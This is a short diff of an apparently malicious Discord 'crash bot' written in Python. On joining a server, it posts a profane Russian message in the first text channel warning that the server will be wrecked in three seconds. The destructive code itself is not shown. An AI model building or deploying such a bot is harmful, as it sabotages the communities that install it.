@@ -8,7 +8,7 @@ token = os.environ.get('TOKENZ')
 class MyClient(discord.Client):
     async def on_guild_join(self, guild):
         a = 0
-        for i in guild.channels:
+        for i in guild.text_channels:
             if a == 0:
                 await i.send('Привет! Спасибо, что добавили ахуенного краш-бота! Вашему серверу придёт пиздец через 3 секунды. Удачи :D')
                 a = 1
